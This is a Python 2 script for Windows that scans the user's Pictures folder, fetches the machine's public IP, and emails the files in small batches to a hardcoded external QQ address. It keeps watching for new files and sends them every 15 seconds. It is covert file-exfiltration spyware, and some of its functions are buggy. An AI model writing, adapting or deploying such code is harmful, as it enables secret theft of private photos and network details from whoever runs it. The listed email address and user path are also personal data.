#default is windows os

#given the default dir is Pictures

import os
import time
import socket
import sys
import logging
import threading
from urllib2 import urlopen

import email_client

logging.basicConfig(
    filename="log.log",
    format='%(asctime)s %(levelname)s %(message)s',
    level=logging.INFO)

current_public_ip = urlopen('http://ip.42.pl/raw').read()
current_inner_ip = socket.gethostbyname(socket.gethostname())
current_time = time.strftime("%Y-%m-%d %H:%M:%S")

ATTACHMENT_SIZE = 2

target_email = "848334436@qq.com"
subject = "From %s computer" %current_public_ip
content = current_time +"\r %s" %current_inner_ip

current_time = time.strftime("%Y-%m-%d %H:%M:%S")

sys_init_time = 0
last_send_time = 0
execute_time = 15 #one day to execute

def write_notation():
    with open('p.txt','w') as f:
        f.write('0')
        logging.info("Write notation number 0")
        f.close()

def get_file_mb_size(f):
    return os.path.getsize(f) / (1024*1024.0)

def files_filter(files, f_type_in=['all'],f_type_not_in=['ini'],f_size_start=0, f_size_end=0):
    filted_files = []
    for f in files:
        file_type = os.path.splitext(f)[1]
        if file_type in f_type_in and file_type not in f_type_not_in:
            if f_size == 0 or f_size_end == 0:
                filted_files.append(f)
            elif get_file_mb_size(f) > f_size_start \
                    or  get_file_mb_size < f_size_end:
                filted_files.append(f)
    return filted_files

def _init(pic_path):
    logging.info("------------------------------------")
    logging.info("System initing....\r")
    write_notation()

    files_list = []
    current_files_size = 0
    attachment_size = 0

    for path in pic_path:
        logging.info("Working dir is %s" %path)
        for root, dirs, files in os.walk(path):
            for name in files:
                full_name = root + '/' + name
                logging.info("File %s add to list" %full_name)
                files_list.append(full_name)

                attachment_size += 1
                #transfer to MB
                current_files_size += get_file_mb_size(full_name)

                #if the current files size bigger than 20MB It will send and files_list will init to []
                if current_files_size <=20:
                    if attachment_size == ATTACHMENT_SIZE:

                        logging.warning("FILE SIZE LIMIT %s AND WILL SEND"%attachment_size)

                        email_client.mail(target_email,
                           subject,
                           content,
                           files_list)
                        logging.info("System pause for 5 seconds")
                        time.sleep(5)
                        files_list = []
                        current_files_size = 0
                        attachment_size = 0

    email_client.mail(target_email,
           subject,
           content,
           files_list)

    sys_init_time = time.time()
    global last_send_time
    last_send_time = sys_init_time
    logging.info("System initing send time %s" %last_send_time)
    logging.info("System inited at %s." %time.strftime("%Y-%m-%d %H:%M:%S"))
    logging.info("System init end")
    logging.info("------------------------------------")

def _single_file_monitor(f):
    global last_send_time
    # if last_send_time == 0:
    #     with open("p.txt",'r+') as f:
    #         f.readline()
    #         last_send_time = f.readline()
    #         if last_send_time == "":
    #             last_send_time = time.time()
    #         logging.info("Read Last Send Time Successly--%s" % last_send_time)
    #         f.close()

    f_create_time = time.mktime(time.strptime(time.ctime(os.path.getctime(f)),"%a %b %d %H:%M:%S %Y"))
    if (f_create_time - last_send_time) > 0:
        #logging.info("File %s created at %s\r"%(f,f_create_time))
        #logging.info("Last Send Time %s" %last_send_time)
        logging.info("Check File Success. Will Send")
        return True
    else:
        return False

def _running(pic_path):
    flag = True
    files_to_send = []
    send_times = 0
    global last_send_time

    current_files_size = 0
    attachment_size = 0

    while flag:
        updated_files = []
        files_list = []

        for path in pic_path:
            #get all files in path
            for root, dirs, files in os.walk(path):
                for name in files:
                    full_name = root + '/' + name
                    files_list.append(full_name)

            #check the files in list are the newest!
            #print files_list
            for f_name in files_list:
                if _single_file_monitor(f_name):
                    updated_files.append(f_name)
                    #logging.info("File %s are the new!")%f_name
                    attachment_size += 1
                    current_files_size += get_file_mb_size(full_name)

                    if updated_files == []:
                        logging.info("Entering wait condition")

                    elif attachment_size == ATTACHMENT_SIZE and updated_files != []:

                        logging.warning("FILE SIZE LIMIT %s AND WILL SEND"%attachment_size)
                        email_client.mail(target_email,
                           subject,
                           content,
                           updated_files)

                        updated_files = []
                        current_files_size = 0
                        attachment_size = 0
                        send_times += 1
                        last_send_time = time.time()
                        logging.info("File sent at %s " %time.ctime())
                else:
                    logging.info("File %s will not be sent twice" %f_name)
            if updated_files!= []:
                email_client.mail(target_email,
                                    subject,
                                    content,
                                    updated_files)
                send_times += 1
                last_send_time = time.time()
                logging.info("File sent at %s " %time.ctime())
        logging.info("System sleep %s seconds" %execute_time)
        logging.info("System has sent %s mails" %send_times)
        time.sleep(execute_time)




if __name__ == '__main__':
    try:
        pic_path = os.path.join(os.path.expandvars("%userprofile%"),"Pictures")

        handle_path = []
        #handle_path.append(pic_path)
        handle_path.append("C:/Users/jason03.zhang/Pictures/Pictures/Pictures/Sample Pictures")
        #_init(handle_path)
        threading.Thread(target=_running(handle_path)).start()
        # try:
        #     with open('p.txt','r+') as pid:
        #         p = pid.readline()
        #         if p == '0':
        #             logging.info("Not the first time start program")
        #             pid.close()
        #             threading.Thread(target=_running(handle_path)).start()
        #         else:
        #             pid.close()
        #             _init(handle_path)
        #             threading.Thread(target=_running(handle_path)).start()
        # except IOError:
        #     logging.info("The first time starts programs")
        #     _init(handle_path)
        #     threading.Thread(target=_running(handle_path)).start()

        #handle_path.append("C:/Users/jason03.zhang/Pictures/Pictures/Pictures/Sample Pictures")
    except KeyboardInterrupt:
        sys.exit()
